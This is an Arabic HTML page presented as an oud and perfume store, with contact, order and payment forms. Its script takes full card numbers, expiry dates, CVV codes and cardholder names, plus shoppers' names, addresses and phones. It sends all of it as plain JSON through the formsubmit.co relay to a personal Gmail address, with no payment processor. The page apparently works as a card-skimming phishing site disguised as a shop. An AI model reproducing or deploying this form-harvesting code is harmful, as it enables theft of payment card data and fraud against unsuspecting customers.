<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مكاسر العود - متجر العود والعطور الفاخر مع الذكاء الاصطناعي</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
        }
        .gradient-bg {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 16px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
            z-index: 2000;
            transform: translateX(400px);
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .notification.show {
            transform: translateX(0);
        }
        .notification.warning {
            background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
        }
        .notification.error {
            background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
        }
        .input-group {
            position: relative;
            margin-bottom: 24px;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 18px 16px;
            border: 2px solid #e5e5e5;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: white;
        }
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: #8B4513;
            box-shadow: 0 0 0 3px rgba(139, 69, 19, 0.1);
        }
        .input-group label {
            position: absolute;
            right: 16px;
            top: 18px;
            background: white;
            padding: 0 8px;
            color: #666;
            transition: all 0.3s ease;
            pointer-events: none;
            font-weight: 500;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label,
        .input-group select:focus + label,
        .input-group select:not([value=""]) + label {
            top: -12px;
            font-size: 14px;
            color: #8B4513;
            font-weight: 600;
        }
        .btn-primary {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            padding: 14px 28px;
            border-radius: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(139, 69, 19, 0.4);
        }
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #8B4513;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-left: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-50">
    <!-- نموذج الاتصال -->
    <section id="contact" class="py-20">
        <div class="container mx-auto px-6">
            <h2 class="text-4xl font-bold text-center mb-16 text-gray-800">تواصل معنا</h2>
            <div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
                <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
                <form id="contactForm" class="space-y-6">
                    <div class="input-group">
                        <input type="text" name="name" required="" placeholder=" ">
                        <label>الاسم الكامل</label>
                    </div>
                    <div class="input-group">
                        <input type="email" name="email" required="" placeholder=" ">
                        <label>البريد الإلكتروني</label>
                    </div>
                    <div class="input-group">
                        <input type="tel" name="phone" placeholder=" ">
                        <label>رقم الهاتف (اختياري)</label>
                    </div>
                    <div class="input-group">
                        <textarea rows="5" name="message" required="" placeholder=" " class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none"></textarea>
                        <label>الرسالة</label>
                    </div>
                    <button type="submit" class="btn-primary w-full" id="submitContactBtn">
                        <i class="fas fa-paper-plane ml-2"></i>
                        إرسال الرسالة
                    </button>
                </form>
            </div>
        </div>
    </section>

    <!-- نموذج طلب الشراء -->
    <section id="order" class="py-20 bg-orange-50">
        <div class="container mx-auto px-6">
            <h2 class="text-4xl font-bold text-center mb-16 text-gray-800">تقديم طلب شراء</h2>
            <div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
                <form id="orderForm" class="space-y-6">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="input-group">
                            <input type="text" name="first_name" required="" placeholder=" ">
                            <label>الاسم الأول</label>
                        </div>
                        <div class="input-group">
                            <input type="text" name="last_name" required="" placeholder=" ">
                            <label>الاسم الأخير</label>
                        </div>
                    </div>
                    <div class="input-group">
                        <input type="email" name="email" required="" placeholder=" ">
                        <label>البريد الإلكتروني</label>
                    </div>
                    <div class="input-group">
                        <input type="tel" name="phone" required="" placeholder=" " pattern="[0-9]{10,}" title="يرجى إدخال رقم هاتف صحيح">
                        <label>رقم الهاتف</label>
                    </div>
                    <div class="input-group">
                        <input type="text" name="address" required="" placeholder=" ">
                        <label>العنوان التفصيلي</label>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="input-group">
                            <select name="city" required="">
                                <option value="">اختر المدينة</option>
                                <option value="الرياض">الرياض</option>
                                <option value="جدة">جدة</option>
                                <option value="الدمام">الدمام</option>
                            </select>
                            <label>المدينة</label>
                        </div>
                        <div class="input-group">
                            <input type="text" name="postal_code" required="" placeholder=" " maxlength="6" pattern="[0-9]{5,6}" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
                            <label>الرمز البريدي</label>
                        </div>
                    </div>
                    <div class="input-group">
                        <textarea rows="4" name="order_notes" placeholder=" " class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none"></textarea>
                        <label>ملاحظات إضافية (اختياري)</label>
                    </div>
                    <button type="submit" class="btn-primary w-full" id="submitOrderBtn">
                        <i class="fas fa-shopping-cart ml-2"></i>
                        تأكيد الطلب
                    </button>
                </form>
            </div>
        </div>
    </section>

    <!-- نموذج الدفع -->
    <section id="payment" class="py-20">
        <div class="container mx-auto px-6">
            <h2 class="text-4xl font-bold text-center mb-16 text-gray-800">إتمام الدفع</h2>
            <div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
                <form id="paymentForm" class="space-y-6">
                    <div class="input-group">
                        <input type="text" name="card_number" required="" placeholder=" " maxlength="19" oninput="formatCardNumber(this)">
                        <label>رقم البطاقة</label>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="input-group">
                            <input type="text" name="expiry_date" required="" placeholder=" " maxlength="5" oninput="formatExpiryDate(this)">
                            <label>تاريخ الانتهاء (شهر/سنة)</label>
                        </div>
                        <div class="input-group">
                            <input type="password" name="cvv" required="" placeholder=" " maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                            <label>رمز الأمان (CVV)</label>
                        </div>
                    </div>
                    <div class="input-group">
                        <input type="text" name="card_holder" required="" placeholder=" ">
                        <label>اسم حامل البطاقة</label>
                    </div>
                    <button type="submit" class="btn-primary w-full" id="submitPaymentBtn">
                        <i class="fas fa-lock ml-2"></i>
                        تأكيد الدفع
                    </button>
                </form>
            </div>
        </div>
    </section>

    <script>
        // دالة لعرض الإشعارات
        function showNotification(message, type = 'success') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="flex items-center">
                    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-exclamation-circle'} ml-3"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 400);
            }, 3000);
        }

        // تنسيق رقم البطاقة
        function formatCardNumber(input) {
            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ');
            input.value = formattedValue || value;
        }

        // تنسيق تاريخ الانتهاء
        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }

        // دالة لمعالجة إرسال النماذج
        async function sendFormData(form, formType) {
            // تعطيل الزر ومنع إرسال متعدد
            const submitBtn = form.querySelector('button[type="submit"]');
            const originalBtnText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري الإرسال...';
            
            try {
                // إنشاء كائن FormData
                const formData = new FormData(form);
                
                // إضافة معلومات إضافية حسب نوع النموذج
                formData.append('form_type', formType);
                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                
                // إرسال البيانات باستخدام fetch
                const response = await fetch('https://formsubmit.co/ajax/alhkr5415@gmail.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(Object.fromEntries(formData.entries()))
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showNotification('✅ تم إرسال البيانات بنجاح! سيتم التواصل معك قريباً.', 'success');
                    
                    // إعادة تعيين النموذج بعد الإرسال الناجح
                    setTimeout(() => {
                        form.reset();
                        submitBtn.innerHTML = originalBtnText;
                        submitBtn.disabled = false;
                    }, 2000);
                } else {
                    throw new Error('فشل في إرسال البيانات');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('❌ حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
                submitBtn.innerHTML = originalBtnText;
                submitBtn.disabled = false;
            }
        }

        // معالجة نموذج الاتصال
        document.getElementById('contactForm').addEventListener('submit', function(e) {
            e.preventDefault();
            sendFormData(this, 'contact_form');
        });

        // معالجة نموذج الطلب
        document.getElementById('orderForm').addEventListener('submit', function(e) {
            e.preventDefault();
            sendFormData(this, 'order_form');
        });

        // معالجة نموذج الدفع
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            sendFormData(this, 'payment_form');
        });

        // اختبار نظام الإيميل
        function testEmailSystem() {
            showNotification('🧪 جاري اختبار نظام الإيميل...', 'warning');
            
            // إنشاء بيانات تجريبية
            const testData = {
                name: 'اختبار النظام',
                email: 'test@example.com',
                message: 'هذه رسالة تجريبية للتأكد من عمل نظام الإيميل بشكل صحيح.',
                form_type: 'test_email',
                timestamp: new Date().toLocaleString('ar-SA')
            };
            
            // إرسال البيانات باستخدام fetch
            fetch('https://formsubmit.co/ajax/alhkr5415@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(testData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification('✅ تم اختبار نظام الإيميل بنجاح!', 'success');
                } else {
                    showNotification('❌ فشل اختبار نظام الإيميل', 'error');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showNotification('❌ حدث خطأ في اختبار نظام الإيميل', 'error');
            });
        }
    </script>
</body>
</html>
